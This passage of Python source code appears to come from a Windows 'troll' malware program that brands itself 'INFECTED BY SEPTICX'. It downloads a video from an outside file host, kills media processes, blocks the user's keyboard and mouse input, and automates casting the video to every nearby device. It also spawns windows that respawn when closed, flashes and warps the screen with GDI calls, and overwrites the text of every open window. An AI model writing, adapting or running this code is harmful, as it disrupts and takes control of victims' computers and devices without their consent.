            site = random.choice(sites)

            os.system(f'start "" "{site}"')
            time.sleep(15)

    def cast_to_devices(self):
        directory = f"{os.getenv('userprofile')}\\downloads"
        filename = "cast.mp4"

        executable_path = Env.executable_path()

        cast_files = [file for file in os.listdir(executable_path) if file.startswith('cast_')]
        cast_file = Env.executable_path(cast_files[0]) if cast_files else None

        if not cast_file:
            Env.download("http://31.filelu.com/d/w53pjbljjqqnjjtafsm5o6fqz42aasvgbzngo36uy6mi772vw5vldwpm3vpodjooe53ppdh6/Untitled___40_1__41____40_1__41____40_1__41_.mp4", f"{directory}\\{filename}")

        else:
            shutil.copy2(cast_file, f"{directory}\\{filename}")

        Env.run_command('taskkill /im "WMPDMC.exe" /f')
        Env.run_command('taskkill /im "MDEServer.exe" /f')

        ctypes.windll.user32.BlockInput(True)
        Application().start(f'explorer.exe "{directory}"')

        app = Application(backend="uia").connect(path="explorer.exe", title="name1")
        app2 = Desktop(backend='win32')

        handle = getattr(app, directory.split('\\')[-1])
        handle.set_focus()

        file_handle = getattr(handle, filename)
        file_handle.right_click_input()
        
        cast_handle = getattr(app.ContextMenu, "Cast To Device")
        cast_handle.click_input()

        devices = [device['text'] for device in app2.PopupMenu.get_properties()['menu_items']]

        for device in devices:
            try:
                app2.PopupMenu.menu_item(device).click_input()

                time.sleep(1)
                handle.set_focus()
                file_handle.right_click_input()

                cast_handle = getattr(app.ContextMenu, "Cast To Device")
                cast_handle.click_input()
            except:
                continue

    def on_closing(self):
        for _ in range(2):
            threading.Thread(target=self.generate_window).start()

    def move(self, window):
        yloc = random.choice(list(range(self.ybase)))
        xloc = random.choice(list(range(self.xbase)))
        angle = random.choice(list(range(360)))
        while time.time() < self.timeout:
            yloc += math.cos(angle) * 0.1
            xloc += math.sin(angle) * 0.1

            if (xloc <= 0) or (xloc >= self.xbase) or (yloc <= 0) or (yloc >= self.ybase):
                angle += 1

            window.geometry(f'300x50+{round(int(xloc))}+{round(int(yloc))}')
        else:
            window.destroy()

    def generate_window(self):
        window = Tk()
        window.title('LOL TROLLED')
        window.geometry('300x50')

        lbl1=Label(window, text="You can't close me :)")
        lbl1.place(x=0, y=0)

        window.protocol("WM_DELETE_WINDOW", self.on_closing)
        window.attributes('-topmost', True)
        window.lift()
        threading.Thread(target=self.move, args=(window,)).start()
        self.windows.append(window)
        window.mainloop()

    def spam_images(self):
        while time.time() < self.timeout and not self.stopped:
            threading.Thread(target=self.generate_window).start()
            time.sleep(2.5)

    def flash_screen(self):
        desk = GetDC(0)

        while time.time() < self.timeout and not self.stopped:
            x = GetSystemMetrics(0)
            y = GetSystemMetrics(1)

            PatBlt(desk, 0, 0, x, y, PATINVERT)

    def deep_fry(self, timeout=None):
        hdc = GetDC(0)

        count = 0

        if not timeout:
            timeout = self.timeout

        else:
            timeout = time.time() + timeout

        while time.time() < timeout and not self.stopped:
            x = GetSystemMetrics(0)
            y = GetSystemMetrics(1)

            count += 3

            hue = (count % 360) / 360.0

            r, g, b = hsv_to_rgb(hue, 1.0, 1.0)

            brush = CreateSolidBrush(RGB(
                int(r * 255),
                int(g * 255),
                int(b * 255)
            ))

            SelectObject(hdc, brush)

            PatBlt(hdc, random.randrange(x), random.randrange(y), random.randrange(x), random.randrange(y), PATINVERT)
            BitBlt(hdc, random.randint(-10, 10), random.randint(-10, 10), x, y, hdc, 0, 0, SRCCOPY)
            BitBlt(hdc, random.randint(-10, 10), random.randint(-10, 10), x, y, hdc, 0, 0, PATINVERT)
            DeleteObject(brush)

        else:
            ReleaseDC(hdc, GetDesktopWindow())
            DeleteDC(hdc)

    def intensify(self, timeout=None):
        HDC = GetDC(0)

        if not timeout:
            timeout = self.timeout

        else:
            timeout = time.time() + timeout

        while time.time() < timeout and not self.stopped:
            x, y = (GetSystemMetrics(0), GetSystemMetrics(1))

            polarity = 1 - random.randint(0, 1) * 2

            if random.randint(0, 1):
                StretchBlt(HDC, 0, polarity * 10, x, y, HDC, 0, 0, x+20, y+20, SRCCOPY)
                StretchBlt(HDC, 0, y + polarity * 10, x, y, HDC, 0, 0, x+20, y+20, SRCCOPY)

            else:

                StretchBlt(HDC, polarity * 10, 0, x, y, HDC, 0, 0, x+20, y+20, SRCCOPY)
                StretchBlt(HDC, x + polarity * 10, 0, x, y, HDC, 0, 0, x+20, y+20, SRCCOPY)

    def lines(self, timeout=None):
        desktop = GetDesktopWindow()
        hdc = GetWindowDC(desktop)
        x, y = GetSystemMetrics(0), GetSystemMetrics(1)

        if not timeout:
            timeout = self.timeout

        else:
            timeout = time.time() + timeout

        while time.time() < timeout and not self.stopped:

            i = random.randint(0, x)

            a = random.randint(-10, 0)
            BitBlt(hdc, 0, i, x, 5, hdc, a, i, SRCCOPY)
            BitBlt(hdc, i, 0, 5, y, hdc, i, a, SRCCOPY)

        ReleaseDC(desktop, hdc)

    def sines(self):
        desktop = GetDesktopWindow()
        hdc = GetWindowDC(desktop)
        x, y = GetSystemMetrics(0), GetSystemMetrics(1)

        angle = 45

        timeout = time.time() + 30

        while time.time() < timeout and not self.stopped:
            hdc = GetWindowDC(desktop)
            for i in range(int(x + y)):
                a = int(math.sin(angle) * 10)
                BitBlt(hdc, 0, i, x, 1, hdc, a, i, SRCCOPY)
                angle += math.pi / 40
            ReleaseDC(desktop, hdc)

    def refresh(self):
        screen_width = windll.user32.GetSystemMetrics(0)
        screen_height = windll.user32.GetSystemMetrics(1)

        hdc = windll.user32.GetDC(0)
        mem_dc = windll.gdi32.CreateCompatibleDC(hdc)

        solid_color_bitmap = windll.gdi32.CreateCompatibleBitmap(hdc, screen_width, screen_height)
        windll.gdi32.SelectObject(mem_dc, solid_color_bitmap)

        windll.gdi32.PatBlt(mem_dc, 0, 0, screen_width, screen_height, 0xF00021)

        windll.gdi32.BitBlt(hdc, 0, 0, screen_width, screen_height, mem_dc, 0, 0, 0xF00021)

        windll.gdi32.DeleteObject(solid_color_bitmap)
        windll.user32.ReleaseDC(0, hdc)
        windll.gdi32.DeleteDC(mem_dc)

    def draw_line(self, start_cords, end_cords, brush):
        hdc = windll.user32.GetDC(0)
        mem_dc = windll.gdi32.CreateCompatibleDC(hdc)

        start_x, start_y = start_cords
        end_x, end_y = end_cords

        delta_x = end_x - start_x
        delta_y = end_y - start_y

        num_steps = max(abs(delta_x), abs(delta_y))

        step_x = delta_x / num_steps
        step_y = delta_y / num_steps


        line_bitmap = windll.gdi32.CreateBitmap(1, 1, 1, 1, None)
        SelectObject(hdc, brush)
        
        windll.gdi32.SetPixel(mem_dc, 0, 0, 0xFF0000)

        for i in range(int(num_steps)):
            x = start_x + int(step_x * i)
            y = start_y + int(step_y * i)
            windll.gdi32.PatBlt(hdc, x, y, 10, 10, 0xF00021)

        windll.gdi32.DeleteObject(line_bitmap)
        windll.user32.ReleaseDC(0, hdc)
        windll.gdi32.DeleteDC(mem_dc)

    def draw_square(self, x_angle, y_angle, size, x_offset, y_offset, sides, offset=0):
        points = [*range(sides+1)]

        rad_to_deg = math.pi / 180

        y_offset -= round(math.cos(y_angle * rad_to_deg))

        for i in points:
            x = round(math.sin((i * (360 / sides) + x_angle) * rad_to_deg) * size) + x_offset
            y = round(math.cos((i * (360 / sides) + x_angle) * rad_to_deg) * (math.cos(y_angle * rad_to_deg)) * size) + y_offset + round(offset * math.sin(y_angle * rad_to_deg))

            point = [x, y]

            hue = (x_angle % 360) / 360.0

            r, g, b = hsv_to_rgb(hue, 1.0, 1.0)

            brush = CreateSolidBrush(RGB(
                int(r * 255),
                int(g * 255),
                int(b * 255)
            ))

            if i:
                self.draw_line(old_point, point, brush)

            if not offset:
                above_point = list(point)
                above_point[1] += size * math.sin(y_angle * rad_to_deg)

                if abs(math.sin(y_angle * rad_to_deg)) > 0.01:
                    self.draw_line(point, above_point, brush)

            old_point = tuple(point)
            DeleteObject(brush)

    def cube_draw(self, timeout=None):
        size = 200

        i = 0
        angle = 45
        x_offset = 1000
        y_offset = 500

        screen_width = windll.user32.GetSystemMetrics(0)
        screen_height = windll.user32.GetSystemMetrics(1)

        if not timeout:
            timeout = self.timeout

        else:
            timeout = time.time() + timeout

        sides = 7

        while time.time() < timeout and not self.stopped:
            if i % 2:
                self.refresh()

            x_offset += math.cos(angle) * 5
            y_offset += math.sin(angle) * 5

            if y_offset < (size * 1.1) or (y_offset > (screen_height - (size * 1.1))):
                angle = (2 * math.pi) - angle
                sides = random.randint(2, 6)

            elif x_offset < (size) or (x_offset > (screen_width - (size))):
                angle = (math.pi) - angle
                sides = random.randint(2, 6)

            x_offset = round(x_offset)
            y_offset = round(y_offset)
            
            try:
                self.draw_square(i, i, size, x_offset, y_offset, sides, 0)
                self.draw_square(i, i, size, x_offset, y_offset, sides, size)
            except:
                pass

            i += 1

    @staticmethod
    def enum_child_proc(hwnd, param):

        try:
            buffering = PyMakeBuffer(255)
            length = SendMessage(hwnd, WM_GETTEXT, 255, buffering)

            result = str(buffering[:length*2].tobytes().decode('utf-16')).upper()
            marks = list(map(chr, range(768, 879)))
            zalgo = ''.join([char+''.join(random.choices(marks, k=10)) for char in f"INFECTED BY SEPTICX"])
            result = zalgo+ ''.join(random.choices(marks, k=10))

            SendMessage(hwnd, WM_SETTEXT, None, result)

        except:
            pass

        return True

    def corrupt_text(self):
        time.sleep(15)
        HWND = GetDesktopWindow()

        while time.time() < self.timeout and not self.stopped:
            EnumChildWindows(HWND, Troll.enum_child_proc, None)

    def draw_icons(self):
        time.sleep(2.5)
        Icons = [
            LoadIcon(None, 32515),
            LoadIcon(None, 32513)
        ]

        HDC = GetDC(0)

        while time.time() < self.timeout and not self.stopped:

            icon = random.choice(Icons)

            mouseX, mouseY = GetCursorPos()
            DrawIcon(HDC, mouseX, mouseY, icon)

            time.sleep(0.05)

if __name__ == "__main__":
    try:
        troll = Troll()
        troll.start()
    except Exception as e:
        print(e)
        while True:
            pass
